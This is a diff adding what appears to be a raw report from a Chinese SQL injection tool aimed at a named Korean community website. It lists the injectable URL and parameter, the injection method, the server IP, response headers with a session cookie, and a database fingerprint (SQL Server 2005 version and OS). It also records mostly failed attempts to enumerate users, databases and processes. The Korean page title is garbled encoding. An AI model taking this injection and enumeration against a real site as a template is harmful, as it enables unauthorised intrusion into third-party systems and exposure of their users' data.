@@ -1,0 +1,57 @@
+■漏洞信息:============================================================
+ ·URL:http://www.heykorean.com/hkboard/sale/sale_view.asp?id=212611
+ ·页面标题：吝绊厘磐 > 扑聪促 > 固惫辑 惯价登绰 抗慧 茄惫 狼幅 海胶飘 碱俏隔 :: HeyKorean 付南敲饭捞胶
+ ·参数:id=212611
+ ·方法:GET
+ ·类型:Numeric
+ ·利用方法:And
+ ·脚本语言:asp
+ ·IP:76.12.31.20
+ ·数据库:SQL Server
+ ·HEAD:
+HTTP/1.1 200 OK
+Connection: close
+Date: Sun, 03 Apr 2011 15:59:14 GMT
+Server: WWW Server/1.1
+Cache-Control: max-age: 315360000
+X-Powered-By: ASP.NET
+pragma: no-cache
+Cache-Control: private
+Content-Length: 117042
+Content-Type: text/html; Charset=euc-kr
+Expires: Sat, 02 Apr 2011 15:59:14 GMT
+Set-Cookie: wZipcode=10010; domain=.heykorean.com; path=/
+Set-Cookie: cookieLocationCode=0; domain=.heykorean.com; path=/
+Set-Cookie: cookieLanguage=ko; domain=.heykorean.com; path=/
+Set-Cookie: user=; domain=heykorean.com; path=/
+Set-Cookie: ASPSESSIONIDSSTBCQRT=PBEKEHJDAGMDDMNAMOMCDNEM; path=/
+Cache-control: no-cache, no-store
+
+
+
+■数据库信息:============================================================
+批次获取基本信息失败，开始逐一获取……
+ ·当前数据库:heykorean
+ ·版本:Microsoft SQL Server 2005 - 9.00.1399.06 (X64) 
+	Oct 14 2005 00:35:21 
+	Copyright (c) 1988-2005 Microsoft Corporation
+	Enterprise Edition (64-bit) on Windows NT 5.2 (Build 3790: Service Pack 2)
+
+■发现SQL2005，建议您先切换到 '杂项工具' 标签页面开启相关设置。
+ ·当前用户权限：
+获取用户权限失败！
+
+ ·数据库信息:
+db_name	filename
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+
+ ·SQL Server用户名列表：
+用户名		角色		安全编号
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+
+ ·数据库相关进程信息:
+程序名	状态	主机名	主机进程ID	命令行	NT用户名
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
